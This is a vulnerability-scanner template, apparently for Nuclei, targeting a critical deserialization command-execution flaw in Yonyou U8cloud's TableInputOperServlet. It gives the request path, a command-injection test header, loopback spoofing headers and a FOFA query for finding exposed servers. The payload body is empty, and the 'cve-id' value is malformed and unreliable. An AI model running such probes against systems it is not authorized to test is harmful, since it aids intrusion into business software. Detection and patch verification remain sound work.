id: 2024-105131759

info:
  name: 用友U8cloud所有版本TableInputOperServlet反序列化漏洞
  author: k3ppf0r
  severity: critical
  description: |  
    攻击者通过发送恶意数据包，利用反序列化数据包，达到命令执行的效果，导致系统被攻击与控制。
  reference:
    - https://security.yonyou.com/#/noticeInfo?id=412
    - https://blog.csdn.net/qq_41904294/article/details/134908263
  remediation: |
    打对应补丁，重启服务
  classification:
    cve-id: 2024-105131759
    cvss-score: 9.8
    cwe-id: CWE-502
  metadata:
    date: 2023-12-14
    version: | 
      U8cloud 1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp
    fofa-query: app="用友-U8-Cloud"
  tags: yonyou,rce,u8c


http:
  - method: POST
    path:
    - '{{RootURL}}/service/~iufo/com.ufsoft.iuforeport.tableinput.TableInputOperServlet'
    headers:
      Cmd: echo {{randstr_1}}
      X-Forwarded-For: 127.0.0.10
      X-Originating-IP: 127.0.0.10
      X-Remote-Addr: 127.0.0.10
      X-Remote-IP: 127.0.0.10
    body: '{{hex_decode("")}}'

    max-redirects: 3
    matchers-condition: and

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, "{{randstr_1}}")
        condition: and